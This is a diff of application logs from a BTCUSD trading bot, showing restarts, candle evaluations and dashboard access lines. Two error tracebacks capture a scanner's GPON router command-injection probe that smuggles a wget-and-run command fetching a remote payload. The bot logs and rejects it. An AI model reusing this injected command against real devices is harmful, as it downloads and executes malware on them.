@@ -78,3 +78,1549 @@
 2026-04-10 09:46:38,161 | INFO     | feed.ws_feed | Boundary tracking: period=1800000ms last_closed_boundary=1775793600000 (will fire when next candle opens)
 2026-04-10 09:46:38,165 | INFO     | feed.ws_feed | WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
 2026-04-10 09:46:38,584 | INFO     | feed.ws_feed | WebSocket subscribed ✅ | FIX-WS-v3: boundary-based detection, fires once per 30m candle
+2026-05-31 13:46:08  WARNING   infra.whatsapp — WhatsApp disabled — set WHATSAPP_ACCESS_TOKEN, WHATSAPP_PHONE_NUMBER_ID, and WHATSAPP_TO_NUMBER in .env to enable notifications.
+2026-05-31 13:46:08  INFO      infra.journal — Connected to SQLite at /root/Bot-v10/journal.db
+2026-05-31 13:46:08  INFO      infra.journal — Migration: added trades.points_captured column
+2026-05-31 13:46:08  INFO      infra.journal — Journal initialised [sqlite] | GSheet=enabled
+2026-05-31 13:46:08  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:46:08  INFO      main —   Shiva Sniper Bot v10 — Starting
+2026-05-31 13:46:08  INFO      main —   Symbol=BTC/USD:USD  TF=30m
+2026-05-31 13:46:08  INFO      main —   Position size: 0.001 BTC → 1 lots
+2026-05-31 13:46:08  INFO      main —   FILTER_VOL_ENABLED=False  (false = full Pine parity)
+2026-05-31 13:46:08  INFO      main —   MAX_ENTRY_SLIP_ATR_FRAC=0.3  (SL recalc threshold)
+2026-05-31 13:46:08  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:46:08  INFO      orders.manager — [OM] Resolved product_id=27 product_symbol=BTCUSD
+2026-05-31 13:46:08  INFO      orders.manager — [OM] Initialized — symbol=BTC/USD:USD  qty=1
+2026-05-31 13:46:09  INFO      main — [STARTUP] Flat on Delta — cancelled all stale bracket orders (clean slate)
+2026-05-31 13:46:10  INFO      infra.telegram — Telegram sent: '🟢 <b>Shiva Sniper Bot v10 Started</b>\nSymbol: <code>BTC/USD:USD</code>  TF: <code>30m</code>\nQty: <code>1 lots</code> (0.001 BTC)\nVolume filter: <code>OFF (Pine parity)</code>'
+2026-05-31 13:46:10  INFO      main — [MAIN] TelegramController started — listening for /start_bot, /stop_bot, /status
+2026-05-31 13:46:10  INFO      main — [MAIN] WhatsAppController started — listening on webhook /webhook port 8080
+2026-05-31 13:46:10  INFO      feed.binance_price_feed — [BINANCE-PX] Feed started → aggTrade stream
+2026-05-31 13:46:10  INFO      main — [MAIN] BinancePriceFeed started — exits now use Binance aggTrade prices
+2026-05-31 13:46:10  INFO      feed.fills_feed — [FILLS] FillsFeed started — listening for bracket fills on BTCUSD
+2026-05-31 13:46:10  INFO      main — [MAIN] FillsFeed started — bracket exits now detected via Delta WS fills
+2026-05-31 13:46:10  WARNING   server — [SERVER] ⚠ Dashboard is using the DEFAULT password on a public bind. Set DASHBOARD_PASS in your .env (and consider DASHBOARD_HOST=127.0.0.1 + an SSH tunnel).
+2026-05-31 13:46:10  INFO      server — Dashboard LIVE → http://0.0.0.0:10000
+2026-05-31 13:46:10  INFO      feed.ws_feed — Loading market map from Delta India (https://api.india.delta.exchange)...
+2026-05-31 13:46:10  INFO      infra.telegram_controller — TelegramController started (long-poll)
+2026-05-31 13:46:10  INFO      feed.binance_price_feed — [BINANCE-PX] Connecting → wss://stream.binance.com:9443/ws/btcusdt@aggTrade
+2026-05-31 13:46:10  INFO      infra.whatsapp_controller — WhatsAppController webhook server started on port 8080
+2026-05-31 13:46:11  INFO      feed.ws_feed — Symbol BTC/USD:USD verified ✅
+2026-05-31 13:46:11  INFO      feed.binance_price_feed — [BINANCE-PX] Connected ✅  (aggTrade stream live)
+2026-05-31 13:46:11  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-05-31 13:46:11  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-05-31 13:46:11  INFO      feed.ws_feed — Loading 250 historical bars via Delta REST for [BTC/USD:USD] [30m]...
+2026-05-31 13:46:12  INFO      feed.ws_feed — Feed ready — 249 bars loaded (need 200, have 249 — OK ✅) [source=Delta]
+2026-05-31 13:46:12  INFO      main — Feed ready — waiting for first bar close...
+2026-05-31 13:46:12  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-05-31 13:46:13  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-05-31 13:46:13  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73951.50 true_low=73839.50 true_close=73872.50
+2026-05-31 13:46:13  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780212600000 | new_boundary=1780214400000 | bars=249 — evaluating signals...
+2026-05-31 13:46:13  INFO      main — [BAR] close=73872.50  atr=137.49  adx=22.4  rsi=43.3  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 13:47:11  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:13:47:11 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 13:59:00  INFO      main — Signal 2 — graceful shutdown initiated...
+2026-05-31 13:59:00  INFO      main — Feed cancelled — shutting down.
+2026-05-31 13:59:00  INFO      main — Shutting down...
+2026-05-31 13:59:00  INFO      server — [SERVER] Dashboard stopped, port released.
+2026-05-31 13:59:00  INFO      trail_loop — TrailMonitor stopped.
+2026-05-31 13:59:00  INFO      feed.binance_price_feed — [BINANCE-PX] Feed stopped.
+2026-05-31 13:59:00  INFO      feed.fills_feed — [FILLS] FillsFeed stopped.
+2026-05-31 13:59:01  INFO      infra.telegram — Telegram sent: '🔴 <b>Shiva Sniper Bot Stopped</b>'
+2026-05-31 13:59:01  INFO      main — Shutdown complete.
+2026-05-31 13:59:02  WARNING   infra.whatsapp — WhatsApp disabled — set WHATSAPP_ACCESS_TOKEN, WHATSAPP_PHONE_NUMBER_ID, and WHATSAPP_TO_NUMBER in .env to enable notifications.
+2026-05-31 13:59:02  INFO      infra.journal — Connected to SQLite at /root/Bot-v10/journal.db
+2026-05-31 13:59:02  INFO      infra.journal — Journal initialised [sqlite] | GSheet=enabled
+2026-05-31 13:59:02  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:59:02  INFO      main —   Shiva Sniper Bot v10 — Starting
+2026-05-31 13:59:02  INFO      main —   Symbol=BTC/USD:USD  TF=30m
+2026-05-31 13:59:02  INFO      main —   Position size: 0.001 BTC → 1 lots
+2026-05-31 13:59:02  INFO      main —   FILTER_VOL_ENABLED=False  (false = full Pine parity)
+2026-05-31 13:59:02  INFO      main —   MAX_ENTRY_SLIP_ATR_FRAC=0.3  (SL recalc threshold)
+2026-05-31 13:59:02  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:59:02  INFO      orders.manager — [OM] Resolved product_id=27 product_symbol=BTCUSD
+2026-05-31 13:59:02  INFO      orders.manager — [OM] Initialized — symbol=BTC/USD:USD  qty=1
+2026-05-31 13:59:03  INFO      main — [STARTUP] Flat on Delta — cancelled all stale bracket orders (clean slate)
+2026-05-31 13:59:04  INFO      infra.telegram — Telegram sent: '🟢 <b>Shiva Sniper Bot v10 Started</b>\nSymbol: <code>BTC/USD:USD</code>  TF: <code>30m</code>\nQty: <code>1 lots</code> (0.001 BTC)\nVolume filter: <code>OFF (Pine parity)</code>'
+2026-05-31 13:59:04  INFO      main — [MAIN] TelegramController started — listening for /start_bot, /stop_bot, /status
+2026-05-31 13:59:04  INFO      main — [MAIN] WhatsAppController started — listening on webhook /webhook port 8080
+2026-05-31 13:59:04  INFO      feed.binance_price_feed — [BINANCE-PX] Feed started → aggTrade stream
+2026-05-31 13:59:04  INFO      main — [MAIN] BinancePriceFeed started — exits now use Binance aggTrade prices
+2026-05-31 13:59:04  INFO      feed.fills_feed — [FILLS] FillsFeed started — listening for bracket fills on BTCUSD
+2026-05-31 13:59:04  INFO      main — [MAIN] FillsFeed started — bracket exits now detected via Delta WS fills
+2026-05-31 13:59:04  INFO      server — Dashboard LIVE → http://127.0.0.1:10000
+2026-05-31 13:59:04  INFO      feed.ws_feed — Loading market map from Delta India (https://api.india.delta.exchange)...
+2026-05-31 13:59:04  INFO      infra.telegram_controller — TelegramController started (long-poll)
+2026-05-31 13:59:04  INFO      feed.binance_price_feed — [BINANCE-PX] Connecting → wss://stream.binance.com:9443/ws/btcusdt@aggTrade
+2026-05-31 13:59:04  INFO      infra.whatsapp_controller — WhatsAppController webhook server started on port 8080
+2026-05-31 13:59:05  INFO      feed.ws_feed — Symbol BTC/USD:USD verified ✅
+2026-05-31 13:59:05  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-05-31 13:59:05  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-05-31 13:59:05  INFO      feed.binance_price_feed — [BINANCE-PX] Connected ✅  (aggTrade stream live)
+2026-05-31 13:59:05  INFO      feed.ws_feed — Loading 250 historical bars via Delta REST for [BTC/USD:USD] [30m]...
+2026-05-31 13:59:06  INFO      feed.ws_feed — Feed ready — 249 bars loaded (need 200, have 249 — OK ✅) [source=Delta]
+2026-05-31 13:59:06  INFO      main — Feed ready — waiting for first bar close...
+2026-05-31 13:59:06  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-05-31 13:59:06  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-05-31 13:59:07  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73960.50 true_low=73839.50 true_close=73940.50
+2026-05-31 13:59:07  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780212600000 | new_boundary=1780214400000 | bars=249 — evaluating signals...
+2026-05-31 13:59:07  INFO      main — [BAR] close=73940.50  atr=138.14  adx=22.4  rsi=47.7  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-05-31 13:59:27  INFO      main — Signal 2 — graceful shutdown initiated...
+2026-05-31 13:59:27  INFO      main — Feed cancelled — shutting down.
+2026-05-31 13:59:27  INFO      main — Shutting down...
+2026-05-31 13:59:27  INFO      server — [SERVER] Dashboard stopped, port released.
+2026-05-31 13:59:27  INFO      trail_loop — TrailMonitor stopped.
+2026-05-31 13:59:27  INFO      feed.binance_price_feed — [BINANCE-PX] Feed stopped.
+2026-05-31 13:59:27  INFO      feed.fills_feed — [FILLS] FillsFeed stopped.
+2026-05-31 13:59:28  INFO      infra.telegram — Telegram sent: '🔴 <b>Shiva Sniper Bot Stopped</b>'
+2026-05-31 13:59:28  INFO      main — Shutdown complete.
+2026-05-31 13:59:29  WARNING   infra.whatsapp — WhatsApp disabled — set WHATSAPP_ACCESS_TOKEN, WHATSAPP_PHONE_NUMBER_ID, and WHATSAPP_TO_NUMBER in .env to enable notifications.
+2026-05-31 13:59:29  INFO      infra.journal — Connected to SQLite at /root/Bot-v10/journal.db
+2026-05-31 13:59:29  INFO      infra.journal — Journal initialised [sqlite] | GSheet=enabled
+2026-05-31 13:59:29  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:59:29  INFO      main —   Shiva Sniper Bot v10 — Starting
+2026-05-31 13:59:29  INFO      main —   Symbol=BTC/USD:USD  TF=30m
+2026-05-31 13:59:29  INFO      main —   Position size: 0.001 BTC → 1 lots
+2026-05-31 13:59:29  INFO      main —   FILTER_VOL_ENABLED=False  (false = full Pine parity)
+2026-05-31 13:59:29  INFO      main —   MAX_ENTRY_SLIP_ATR_FRAC=0.3  (SL recalc threshold)
+2026-05-31 13:59:29  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:59:30  INFO      orders.manager — [OM] Resolved product_id=27 product_symbol=BTCUSD
+2026-05-31 13:59:30  INFO      orders.manager — [OM] Initialized — symbol=BTC/USD:USD  qty=1
+2026-05-31 13:59:31  INFO      main — [STARTUP] Flat on Delta — cancelled all stale bracket orders (clean slate)
+2026-05-31 13:59:32  INFO      infra.telegram — Telegram sent: '🟢 <b>Shiva Sniper Bot v10 Started</b>\nSymbol: <code>BTC/USD:USD</code>  TF: <code>30m</code>\nQty: <code>1 lots</code> (0.001 BTC)\nVolume filter: <code>OFF (Pine parity)</code>'
+2026-05-31 13:59:32  INFO      main — [MAIN] TelegramController started — listening for /start_bot, /stop_bot, /status
+2026-05-31 13:59:32  INFO      main — [MAIN] WhatsAppController started — listening on webhook /webhook port 8080
+2026-05-31 13:59:32  INFO      feed.binance_price_feed — [BINANCE-PX] Feed started → aggTrade stream
+2026-05-31 13:59:32  INFO      main — [MAIN] BinancePriceFeed started — exits now use Binance aggTrade prices
+2026-05-31 13:59:32  INFO      feed.fills_feed — [FILLS] FillsFeed started — listening for bracket fills on BTCUSD
+2026-05-31 13:59:32  INFO      main — [MAIN] FillsFeed started — bracket exits now detected via Delta WS fills
+2026-05-31 13:59:32  INFO      server — Dashboard LIVE → http://127.0.0.1:10000
+2026-05-31 13:59:32  INFO      feed.ws_feed — Loading market map from Delta India (https://api.india.delta.exchange)...
+2026-05-31 13:59:32  INFO      infra.telegram_controller — TelegramController started (long-poll)
+2026-05-31 13:59:32  INFO      feed.binance_price_feed — [BINANCE-PX] Connecting → wss://stream.binance.com:9443/ws/btcusdt@aggTrade
+2026-05-31 13:59:32  INFO      infra.whatsapp_controller — WhatsAppController webhook server started on port 8080
+2026-05-31 13:59:32  INFO      feed.ws_feed — Symbol BTC/USD:USD verified ✅
+2026-05-31 13:59:32  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-05-31 13:59:32  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-05-31 13:59:32  INFO      feed.binance_price_feed — [BINANCE-PX] Connected ✅  (aggTrade stream live)
+2026-05-31 13:59:32  INFO      feed.ws_feed — Loading 250 historical bars via Delta REST for [BTC/USD:USD] [30m]...
+2026-05-31 13:59:34  INFO      feed.ws_feed — Feed ready — 249 bars loaded (need 200, have 249 — OK ✅) [source=Delta]
+2026-05-31 13:59:34  INFO      main — Feed ready — waiting for first bar close...
+2026-05-31 13:59:34  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-05-31 13:59:34  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-05-31 13:59:34  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73960.50 true_low=73839.50 true_close=73940.50
+2026-05-31 13:59:34  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780212600000 | new_boundary=1780214400000 | bars=249 — evaluating signals...
+2026-05-31 13:59:35  INFO      main — [BAR] close=73940.50  atr=138.14  adx=22.4  rsi=47.7  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-05-31 13:59:35  INFO      main — Signal 2 — graceful shutdown initiated...
+2026-05-31 13:59:35  INFO      main — Feed cancelled — shutting down.
+2026-05-31 13:59:35  INFO      main — Shutting down...
+2026-05-31 13:59:35  INFO      server — [SERVER] Dashboard stopped, port released.
+2026-05-31 13:59:35  INFO      trail_loop — TrailMonitor stopped.
+2026-05-31 13:59:35  INFO      feed.binance_price_feed — [BINANCE-PX] Feed stopped.
+2026-05-31 13:59:35  INFO      feed.fills_feed — [FILLS] FillsFeed stopped.
+2026-05-31 13:59:36  INFO      infra.telegram — Telegram sent: '🔴 <b>Shiva Sniper Bot Stopped</b>'
+2026-05-31 13:59:36  INFO      main — Shutdown complete.
+2026-05-31 13:59:37  WARNING   infra.whatsapp — WhatsApp disabled — set WHATSAPP_ACCESS_TOKEN, WHATSAPP_PHONE_NUMBER_ID, and WHATSAPP_TO_NUMBER in .env to enable notifications.
+2026-05-31 13:59:37  INFO      infra.journal — Connected to SQLite at /root/Bot-v10/journal.db
+2026-05-31 13:59:37  INFO      infra.journal — Journal initialised [sqlite] | GSheet=enabled
+2026-05-31 13:59:37  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:59:37  INFO      main —   Shiva Sniper Bot v10 — Starting
+2026-05-31 13:59:37  INFO      main —   Symbol=BTC/USD:USD  TF=30m
+2026-05-31 13:59:37  INFO      main —   Position size: 0.001 BTC → 1 lots
+2026-05-31 13:59:37  INFO      main —   FILTER_VOL_ENABLED=False  (false = full Pine parity)
+2026-05-31 13:59:37  INFO      main —   MAX_ENTRY_SLIP_ATR_FRAC=0.3  (SL recalc threshold)
+2026-05-31 13:59:37  INFO      main — ══════════════════════════════════════════════════════════════════════
+2026-05-31 13:59:37  INFO      orders.manager — [OM] Resolved product_id=27 product_symbol=BTCUSD
+2026-05-31 13:59:37  INFO      orders.manager — [OM] Initialized — symbol=BTC/USD:USD  qty=1
+2026-05-31 13:59:38  INFO      main — [STARTUP] Flat on Delta — cancelled all stale bracket orders (clean slate)
+2026-05-31 13:59:39  INFO      infra.telegram — Telegram sent: '🟢 <b>Shiva Sniper Bot v10 Started</b>\nSymbol: <code>BTC/USD:USD</code>  TF: <code>30m</code>\nQty: <code>1 lots</code> (0.001 BTC)\nVolume filter: <code>OFF (Pine parity)</code>'
+2026-05-31 13:59:39  INFO      main — [MAIN] TelegramController started — listening for /start_bot, /stop_bot, /status
+2026-05-31 13:59:39  INFO      main — [MAIN] WhatsAppController started — listening on webhook /webhook port 8080
+2026-05-31 13:59:39  INFO      feed.binance_price_feed — [BINANCE-PX] Feed started → aggTrade stream
+2026-05-31 13:59:39  INFO      main — [MAIN] BinancePriceFeed started — exits now use Binance aggTrade prices
+2026-05-31 13:59:39  INFO      feed.fills_feed — [FILLS] FillsFeed started — listening for bracket fills on BTCUSD
+2026-05-31 13:59:39  INFO      main — [MAIN] FillsFeed started — bracket exits now detected via Delta WS fills
+2026-05-31 13:59:39  INFO      server — Dashboard LIVE → http://127.0.0.1:10000
+2026-05-31 13:59:39  INFO      feed.ws_feed — Loading market map from Delta India (https://api.india.delta.exchange)...
+2026-05-31 13:59:39  INFO      infra.telegram_controller — TelegramController started (long-poll)
+2026-05-31 13:59:39  INFO      feed.binance_price_feed — [BINANCE-PX] Connecting → wss://stream.binance.com:9443/ws/btcusdt@aggTrade
+2026-05-31 13:59:39  INFO      infra.whatsapp_controller — WhatsAppController webhook server started on port 8080
+2026-05-31 13:59:40  INFO      feed.ws_feed — Symbol BTC/USD:USD verified ✅
+2026-05-31 13:59:40  INFO      feed.fills_feed — [FILLS] WS auth sent — waiting for confirmation...
+2026-05-31 13:59:40  INFO      feed.fills_feed — [FILLS] Subscribed to user_trades | symbol=BTCUSD
+2026-05-31 13:59:40  INFO      feed.binance_price_feed — [BINANCE-PX] Connected ✅  (aggTrade stream live)
+2026-05-31 13:59:40  INFO      feed.ws_feed — Loading 250 historical bars via Delta REST for [BTC/USD:USD] [30m]...
+2026-05-31 13:59:41  INFO      feed.ws_feed — Feed ready — 249 bars loaded (need 200, have 249 — OK ✅) [source=Delta]
+2026-05-31 13:59:41  INFO      main — Feed ready — waiting for first bar close...
+2026-05-31 13:59:41  INFO      feed.ws_feed — WebSocket connecting → wss://socket.india.delta.exchange | channel=candlestick_30m symbol=BTCUSD
+2026-05-31 13:59:42  INFO      feed.ws_feed — WebSocket subscribed ✅
+2026-05-31 13:59:42  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73960.50 true_low=73839.50 true_close=73940.50
+2026-05-31 13:59:42  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780212600000 | new_boundary=1780214400000 | bars=249 — evaluating signals...
+2026-05-31 13:59:42  INFO      main — [BAR] close=73940.50  atr=138.14  adx=22.4  rsi=47.7  trend=True  range=False  filters=OK  [atr=True body=True vol=True]
+2026-05-31 14:00:02  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73960.50 true_low=73839.50 true_close=73929.50
+2026-05-31 14:00:02  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780214400000 | new_boundary=1780216200000 | bars=250 — evaluating signals...
+2026-05-31 14:00:02  INFO      main — [BAR] close=73929.50  atr=136.91  adx=21.5  rsi=47.0  trend=False  range=False  filters=OK  [atr=True body=True vol=True]
+2026-05-31 14:22:57  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:14:22:57 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 14:30:02  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73957.50 true_low=73823.00 true_close=73950.50
+2026-05-31 14:30:02  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780216200000 | new_boundary=1780218000000 | bars=250 — evaluating signals...
+2026-05-31 14:30:02  INFO      main — [BAR] close=73950.50  atr=136.74  adx=20.8  rsi=48.4  trend=False  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 14:50:39  ERROR     aiohttp.server — Error handling request
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/aiohttp/web_protocol.py", line 377, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "aiohttp/_http_parser.pyx", line 563, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://140.233.190.47/gpon+-O+/tmp/ger;sh+/tmp/ger`&ipv=0'
+      ^
+2026-05-31 14:50:39  INFO      aiohttp.access — 164.163.237.230 [31/May/2026:14:50:39 +0530] "UNKNOWN / HTTP/1.0" 400 334 "-" "-"
+2026-05-31 15:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73953.50 true_low=73844.00 true_close=73931.00
+2026-05-31 15:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780218000000 | new_boundary=1780219800000 | bars=250 — evaluating signals...
+2026-05-31 15:00:01  INFO      main — [BAR] close=73931.00  atr=134.79  adx=20.2  rsi=47.2  trend=False  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 15:00:05  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:15:00:05 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 15:05:24  INFO      aiohttp.access — 45.205.1.196 [31/May/2026:15:05:24 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 15:30:02  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74008.00 true_low=73813.50 true_close=73813.50
+2026-05-31 15:30:02  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780219800000 | new_boundary=1780221600000 | bars=250 — evaluating signals...
+2026-05-31 15:30:02  INFO      main — [BAR] close=73813.50  atr=139.06  adx=19.4  rsi=40.4  trend=False  range=False  filters=OK  [atr=True body=True vol=True]
+2026-05-31 15:35:13  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:15:35:13 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 16:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73846.50 true_low=73708.00 true_close=73775.50
+2026-05-31 16:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780221600000 | new_boundary=1780223400000 | bars=250 — evaluating signals...
+2026-05-31 16:00:00  INFO      main — [BAR] close=73775.50  atr=139.02  adx=18.9  rsi=38.5  trend=False  range=False  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 16:11:15  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:16:11:15 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 16:22:29  INFO      aiohttp.access — 45.205.1.196 [31/May/2026:16:22:29 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 16:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73883.50 true_low=73780.50 true_close=73876.00
+2026-05-31 16:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780223400000 | new_boundary=1780225200000 | bars=250 — evaluating signals...
+2026-05-31 16:30:00  INFO      main — [BAR] close=73876.00  atr=136.80  adx=18.4  rsi=45.8  trend=False  range=False  filters=OK  [atr=True body=True vol=True]
+2026-05-31 16:48:05  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:16:48:05 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 17:00:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73944.50 true_low=73875.00 true_close=73943.00
+2026-05-31 17:00:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780225200000 | new_boundary=1780227000000 | bars=250 — evaluating signals...
+2026-05-31 17:00:00  INFO      main — [BAR] close=73943.00  atr=132.00  adx=17.7  rsi=50.1  trend=False  range=True  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 17:24:34  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:17:24:34 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 17:30:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73957.50 true_low=73887.50 true_close=73952.50
+2026-05-31 17:30:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780227000000 | new_boundary=1780228800000 | bars=250 — evaluating signals...
+2026-05-31 17:30:01  INFO      main — [BAR] close=73952.50  atr=127.57  adx=16.9  rsi=50.7  trend=False  range=True  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 17:42:05  ERROR     aiohttp.server — Error handling request
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.12/dist-packages/aiohttp/web_protocol.py", line 377, in data_received
+    messages, upgraded, tail = self._request_parser.feed_data(data)
+                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "aiohttp/_http_parser.pyx", line 563, in aiohttp._http_parser.HttpParser.feed_data
+aiohttp.http_exceptions.BadStatusLine: 400, message:
+  Invalid method encountered:
+
+    b'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://140.233.190.47/gpon+-O+/tmp/ger;sh+/tmp/ger`&ipv=0'
+      ^
+2026-05-31 17:42:05  INFO      aiohttp.access — 102.64.157.61 [31/May/2026:17:42:05 +0530] "UNKNOWN / HTTP/1.0" 400 334 "-" "-"
+2026-05-31 17:51:23  INFO      aiohttp.access — 45.205.1.196 [31/May/2026:17:51:23 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 17:59:04  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:17:59:04 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 18:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73983.00 true_low=73848.00 true_close=73913.50
+2026-05-31 18:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780228800000 | new_boundary=1780230600000 | bars=250 — evaluating signals...
+2026-05-31 18:00:01  INFO      main — [BAR] close=73913.50  atr=128.10  adx=16.1  rsi=48.2  trend=False  range=True  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 18:30:02  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=73963.00 true_low=73869.50 true_close=73899.00
+2026-05-31 18:30:02  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780230600000 | new_boundary=1780232400000 | bars=250 — evaluating signals...
+2026-05-31 18:30:02  INFO      main — [BAR] close=73899.00  atr=125.63  adx=15.4  rsi=47.2  trend=False  range=True  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 18:34:54  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:18:34:54 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 18:46:08  INFO      aiohttp.access — 156.238.229.134 [31/May/2026:18:46:08 +0530] "CONNECT  HTTP/1.1" 404 175 "-" "-"
+2026-05-31 18:46:08  INFO      aiohttp.access — 156.238.229.134 [31/May/2026:18:46:08 +0530] "CONNECT  HTTP/1.1" 404 175 "-" "-"
+2026-05-31 19:00:01  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=74007.50 true_low=73856.50 true_close=73931.00
+2026-05-31 19:00:01  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780232400000 | new_boundary=1780234200000 | bars=250 — evaluating signals...
+2026-05-31 19:00:01  INFO      main — [BAR] close=73931.00  atr=127.44  adx=14.6  rsi=49.6  trend=False  range=True  filters=FAIL  [atr=True body=False vol=True]
+2026-05-31 19:03:14  INFO      aiohttp.access — 45.205.1.196 [31/May/2026:19:03:14 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-05-31 19:13:12  INFO      aiohttp.access — 45.198.224.186 [31/May/2026:19:13:12 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
